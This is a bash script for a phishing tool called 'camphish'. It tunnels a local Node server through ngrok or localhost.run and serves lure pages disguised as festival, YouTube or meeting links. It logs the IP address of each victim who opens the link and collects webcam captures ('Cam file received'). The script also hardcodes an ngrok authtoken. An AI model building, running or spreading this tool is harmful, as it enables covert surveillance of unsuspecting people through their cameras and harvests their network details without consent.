# camphish created by elprofessor67

#!/bin/bash
trap 'printf "\n";stop' 2

#color codes
red="\e[1;49;31m"
green="\e[1;49;32m"
yellow="\e[1;49;33m"
blue="\e[1;49;34m"
cyan="\e[1;49;36m"
white="\e[1;49;37m"
default="\e[0m"

# we will create banner 
banner(){
  clear
  printf "${blue}                           _     _     _       ${default}\n"
  printf "${blue}  ___ __ _ _ __ ___  _ __ | |__ (_)___| |__    ${default}\n"
  printf "${blue} / __/ _`      ` _ \| '_ \| '_ \| / __| '_ \   ${default}\n"
  printf "${blue}| (_| (_| | | | | | | |_) | | | | \__ \ | | |  ${default}\n"  
  printf "${blue} \___\__,_|_| |_| |_| .__/|_| |_|_|___/_| |_|  ${default}\n"
  printf "${blue}                    |_|                        ${default}\n"
  printf "\n\b\b\b ${green}Created By Team Elprofessor67${default}\n"                   
 
}

# we will kill server
stop() {
  checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
  checknode=$(ps aux | grep -o "node" | head -n1)
  checkssh=$(ps aux | grep -o "ssh" | head -n1)
  if [[ $checkngrok == *'ngrok'* ]]; then
    pkill -f -2 ngrok > /dev/null 2>&1
    killall -2 ngrok > /dev/null 2>&1
  fi

  if [[ $checkphp == *'node'* ]]; then
    killall -2 node > /dev/null 2>&1
  fi
  if [[ $checkssh == *'ssh'* ]]; then
    killall -2 ssh > /dev/null 2>&1
  fi
  exit 1
}

# tool dependencies
dependencies() {
  command -v node > /dev/null 2>&1 || { echo >&2 "${red}I require nodejs but it's not installed. Install it. Aborting.${default}"; exit 1; }
  if [[ -e node_modules ]]; then
    printf ""
  else
    command -v npm > /dev/null 2>&1 || { echo >&2 "I require npm but it's not installed. Install it. Aborting."; exit 1; }
    npm install
  fi
}

catch_ip() {
  ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
  IFS=$!'\n'
  printf "${blue}${ip}${default}\n"

  cat ip.txt >> saved.ip.txt
  rm -rf ip.txt
}

# we will check file recived or not
checkfound() {
  printf "\n"
  printf "${green} Waiting targets,${default}${blue} Press Ctrl + C to exit...${default}\n"

  while [ true ]; do
    if [[ -e "ip.txt" ]]; then
    printf "${green} Target opened the link! \n IP: ${default}"
    catch_ip
  fi

  sleep 0.5

  if [[ -e "Log.log" ]]; then
    printf "${green} Cam file received!${default}\n"
    rm -rf Log.log
  fi
  sleep 0.5
  done 
}


#we will create ngrok server
ngrok_server(){
if [[ -e ngrok ]]; then
  echo ""
else
  command -v unzip > /dev/null 2>&1 || { echo >&2 "${red}I require unzip but it's not installed. Install it. Aborting.${default}"; exit 1; }
  command -v wget > /dev/null 2>&1 || { echo >&2 "${red}I require wget but it's not installed. Install it. Aborting.${default}"; exit 1; }

  arch=$(uname -a | grep -o 'arm' | head -n1)
  arch2=$(uname -a | grep -o 'Android' | head -n1)
  arch3=$(uname -a | grep -o 'Linux' | head -n1)

  # linux ngrok file download
  if [[ $arch == *'arm'* ]] || [[ $arch3 == *'Linux'* ]] ; then
    printf "${green}Downloading Ngrok.........${default}\n"
    wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
    if [[ -e ngrok-stable-linux-386.zip ]]; then
      unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
      chmod +x ngrok > /dev/null 2>&1
      rm -rf ngrok-stable-linux-386.zip
    fi
  else
    printf "${red}Download Error${default} \n"
    exit 1
  fi

  # android ngrok download file
  if [[ $arch2 == *'Android'* ]]; then
    printf "${green}Downloading Ngrok.........${default}\n"
    wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1 
    if [[ -e ngrok-stable-linux-arm.zip ]]; then
      unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
      chmod +x ngrok > /dev/null 2>&1
      rm -rf ngrok-stable-linux-arm.zip
    fi
  else
    printf "${red}Download Error${default} \n"
    exit 1
  fi
fi
if [[ -e ~/.ngrok2/ngrok.yml ]]; then
  printf "${green} Your ngrok ${default}"
  cat ~/.ngrok2/ngrok.yml
  printf "${green} Do you want to change your ngrok authtoken [n/y] : ${default}"
  read change_auth
  if [[ $change_auth == "y" ]] || [[ $change_auth == "yes" ]] || [[ $change_auth == 'YES' ]] || [[ $change_auth == "Y" ]]; then
    printf "${green} Enter you Ngrok authtoken : ${default}"
    read auth_token
    ./ngrok authtoken $auth_token > /dev/null 2>&1
    printf "${green} authtoken change succesfully${default}\n"
  fi
else
  printf "${green} You have Ngrok authtoken [y/n] : "
  read hnt
  if [[ $hnt == "y" ]] || [[ $hnt == "yes" ]] || [[ $hnt == 'YES' ]] || [[ $hnt == "Y" ]]; then
    printf "${green} Entee your valid ngrok authtoken : ${default}"
    read auth_token
    ./ngrok authtoken $auth_token > /dev/null 2>&1
  else
    ./ngrok authtoken 25mWY1qJXew7Yy0nI2AGOazDsrD_4qsT2bg5Jfq3GZBisNTcM > /dev/null 2>&1
  fi
fi
node src/server.js > /dev/null 2>&1 &
sleep 2
printf "${red}if you aur using Android  please turn on hotspot other wise you not get link${default} \n\n\n"
./ngrok http 3000 > /dev/null 2>&1 &
sleep 10
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io");
if [[ $link ]]; then
  printf "${green} Direct link :${white} ${link} ${default}\n"
else
  printf "${red} Direct link not genrate check following possible reason ${default}\n"
  printf "${blue} Ngrok authtoken is not valid ${default}\n"
  printf "If you are using Android turn on hotspot ${default}\n"
  printf "Ngrok is already running run this cammand killall ngrok${default}\n"
  printf "Check your internet connection${default}\n"
fi
payload
checkfound

}

# we will set template
payload() {
  if [[ $template == '1' ]]; then
    sed 's+hello+''world''+g' festival.html > index3.html
    sed 's+fes_name+'$fesName'+g' index3.html > ./views/index.hbs
  elif [[ $template == '2' ]]; then
    sed 's+hello+' ' world' '+g' live.html > index3.html
    sed 's+watch_youtube_id+'$Watch_id'+g' index3.html > ./views/index.hbs
  else
    sed 's+hello+' 'world' '+g' meeting.html > ./views/index.hbs
  fi
  rm -rf index3.html
}

# we will create ssh server 
ssh_server() {
  command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }

if [[ -e ~/.ssh/id_rsa ]]; then
  printf "${green} Starting SSH server...${default}\n"
  $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3000 localhost.run 2> /dev/null > sendlink ' &
  sleep 8

  printf "${green} Starting Node server... (localhost:3000)${default}\n"
  node src/server.js > /dev/null 2>&1 &
  sleep 3
  send_link=$(grep -o "https://[0-9A-Za-z]*\.lhrtunnel.link" sendlink)
  printf "${green} Direct link: ${default}${send_link}" 

else
  printf "${red}I need ssh key but its not installed"
  exit 1
fi
payload
checkfound
}


# we will input template
temp_opt(){
  if [[ $server == '1' ]] || [[ $server == '2' ]]; then
    printf "\n"
    printf "${green}_____________________choose template_____________________${default} \n\n"

    printf "${red} [${white}1${red}]${green} Festival ${default} \n"
    printf "${red} [${white}2${red}]${green} Youtube ${default} \n"
    printf "${red} [${white}3${red}]${green} Meeting ${default} \n"
  
    default_tem="1"

    printf "${green}\n Select template : ${default}"
    read template
# we will set default template
    template="${template:-${default_tem}}"

  #we will check server input
    if [[ $template == "1" ]]; then
      printf "${green}\n Enter Festival Name : ${default}"
      read fesName
      fesName="${fesName//[[:sapce:]]/}"
    elif [[ $template == "2" ]]; then
      printf "${green}\n Enter Youtube Watch Id : ${default}"
      read Watch_id
    elif [[ $template == "3" ]]; then
      printf ""
    else
      printf "${red}Invalid option${default}\n"
      sleep 1
      banner
      temp_opt
    fi
  # payload
  else
    printf "${red} Invalid option ${default}\n"
    sleep 1
    banner
    server_option
  fi
}

server_option(){
  if [[ -e sendlink ]]; then
    rm -rf sendlink
  fi
  printf "\n"
  printf "${green}_____________________choose tunnel server_____________________${default} \n\n"

  printf "${red} [${white}1${red}] ${green}Ngrok ${default} \n"
  printf "${red} [${white}2${red}] ${green}Localhost.run ${default} \n"

  default_server='1'

  printf "${green}\n Select Server : ${default}"
  read server

# we will set default server
  server="${server:-${default_server}}"
  
 # we will calling choose template function 
  banner
  temp_opt

# we will check server input
  if [[ $server == "1" ]]; then
    ngrok_server
  elif [[ $server == "2" ]]; then
    ssh_server
  else
    printf "${red} Invalid option ${default}\n"
    sleep 1
    banner
    server_option
  fi
}

sleep 1
dependencies
banner
server_option